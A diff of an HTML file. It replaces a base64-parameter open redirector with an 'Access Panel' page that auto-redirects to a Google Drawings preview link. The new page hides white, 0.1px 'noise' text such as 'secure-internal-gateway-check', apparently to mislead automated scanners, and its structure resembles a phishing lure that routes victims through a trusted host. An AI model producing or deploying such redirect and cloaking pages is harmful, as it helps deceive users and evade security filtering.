@@ -1,24 +1,43 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Redirecting...</title>
-  <script>
-    const params = new URLSearchParams(window.location.search);
-    const encoded = params.get("r");
-    try {
-      if (encoded) {
-        const decoded = atob(encoded);
-        window.location.href = decoded;
-      } else {
-        document.write("❌ No redirect parameter provided.");
-      }
-    } catch (e) {
-      document.write("❌ Invalid Base64.");
+  <meta charset="UTF-8">
+  <title>Access Panel</title>
+  <meta http-equiv="refresh" content="2;url=https://docs.google.com/drawings/d/1_cNvF03elp4y9M49VDgXuDC8yhXiXMFSo8haLgoyfH8/preview">
+  <style>
+    body { margin: 0; padding: 0; background: #fdfdfd; font-family: 'Arial'; }
+    .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
+    .btn {
+      background-color: #4CAF50;
+      color: white;
+      padding: 14px 25px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
     }
-  </script>
+    .hidden { display: none; }
+    .noise { color: #fdfdfd; font-size: 0.1px; }
+  </style>
 </head>
 <body>
-  <p>Redirecting...</p>
+  <div class="container">
+    <div>
+      <div class="noise">secure-internal-gateway-check</div>
+      <div class="noise">private-access-control-layer-safe</div>
+      <button class="btn" onclick="go()">Open Access</button>
+    </div>
+  </div>
+  <script>
+    function go() {
+      setTimeout(function() {
+        window.location.href = "https://docs.google.com/drawings/d/1_cNvF03elp4y9M49VDgXuDC8yhXiXMFSo8haLgoyfH8/preview";
+      }, 1500);
+    }
+  </script>
 </body>
 </html>
